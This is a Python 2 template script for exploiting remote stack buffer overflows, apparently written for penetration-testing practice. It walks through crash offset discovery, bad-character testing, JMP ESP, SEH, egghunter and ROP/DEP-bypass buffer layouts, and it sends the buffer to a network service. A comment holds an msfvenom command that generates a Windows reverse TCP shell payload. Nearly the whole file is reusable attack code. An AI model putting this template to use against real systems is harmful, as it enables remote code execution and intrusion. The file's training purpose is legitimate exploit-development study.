#!/usr/bin/python2

import sys, socket, os, struct

#EXPLOIT METHODOLOGY: REMOTE BUFFER OVERFLOW
#---------------------------------------------------------------------------------------------------------------------------------------

#IP + SERVICE PORT + NOPS
IP = '127.0.0.1'
port = 31337
NOPS = "\x90" * 16

#FIND OFFSET --> WRITE THE EIP CRASHED VALUE INTO THE FIRST VARIABLE
eip_crash = "39654138"
offset = int(os.popen("msf-pattern_offset -q " + str(eip_crash) + " | awk '{print $6}'").read())

#BADCHAR TEST --> !mona cmp -a esp -f C:/badchars.bin --> ADD THE BADCHARS YOU FIND TO THE LIST
charset = ""
badchars_lst = [0x00,0x0A,0x0D]

for i in range(0x00, 0xFF+1):
	if i not in badchars_lst:
		charset += chr(i)

with open ("~/.wine/drive_c/badchars.bin", "wb") as f:
	f.write(charset)

#JMP ESP SEARCH --> !mona jmp -r esp -cpb '\x00\x0a\x0d...'
JMP_ESP = 0x080414c3


#EGGHUNTING + SEH BASED OVERFLOWS PARAMETERS
#---------------------------------------------------------------------------------------------------------------------------------------
#Generate egghunter: msf-egghunter -p windows -a x86 -f c -e b33f -b '\x00\x0a...'
egghunter=("")

#SEH-BASED -> Copy the SEH crash address: ALT + S
SEH_crash_address = 0x625010B4
SEH_offset = int(os.popen("msf-pattern_offset -q " + str(SEH_crash_address) + " | awk '{print $6}'").read())

#POP POT RETN Address: !mona seh (check those without badchars)
pop_pop_retn = 0x61617619
#---------------------------------------------------------------------------------------------------------------------------------------


#ROP CHAIN CODE
#---------------------------------------------------------------------------------------------------------------------------------------

rop_chain = ""

#---------------------------------------------------------------------------------------------------------------------------------------


#SHELLCODE CONSTRUCTION
#---------------------------------------------------------------------------------------------------------------------------------------
#msfvenom -p windows/shell_reverse_tcp LHOST=[IP] LPORT=443 EXITFUNC=thread -f c -a x86 -b "\x00\x0a\x0d" AutoRunScript=post/windows/manage/migrate
#For egghunting, generate it with -e x86/alpha_mixed
payload = ("")

#Standard Stack execution
shellcode_std = "A" * offset + struct.pack("<I",JMP_ESP) + NOPS + payload

#Egghunting Stack-based (send stage2 first in another entry point, then stage1 in original BOF point)
egg_stage1 = "A"*(offset - len(egghunter) - len(NOPS)*2) + NOPS + egghunter + NOPS + struct.pack("<I",JMP_ESP) + "\xEB\xC4\x90\x90"
egg_stage2 = "b33fb33f" + payload

#SEH Based
shellcode_SEH = "A"*(SEH_offset - 4) + "\xEB\x06\x90\x90" + struct.pack("<I",pop_pop_retn) + NOPS + payload

#DEP Bypass: !mona rop -m *.dll -n -cpb '\x00\x0a\x0d'
shellcode_ROP = "A"*offset + rop_chain + NOPS + payload
#---------------------------------------------------------------------------------------------------------------------------------------


#DATA SENDING FUNCTION
def send_data(IP,port,BUFFER):
	try:
		print "Sending data..."
        	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        	s.connect((IP,port))
	       	s.send(BUFFER + "\n")
		print "Finished sending data!"
        	s.close
	except:
        	print "Error connecting to the server"
        	sys.exit()

#PATTERN CONSTRUCTION -> INCREMENT BYTE_CRASH BY 200
byte_crash = 1000
pattern = str(os.popen("msf-pattern_create -l " + str(byte_crash)).read())

#EIP CONTROL STRING
eip_control = "A"*offset + "BBBB" + "C"*(byte_crash - offset - 4)

#BADCHAR STRING
badchars = "A"*offset + "BBBB" + charset

#SEND THE DATA: "pattern" --> "eip_control" --> "badchars" --> shellcode
EVIL_BUFFER = pattern
send_data(IP, port, EVIL_BUFFER)
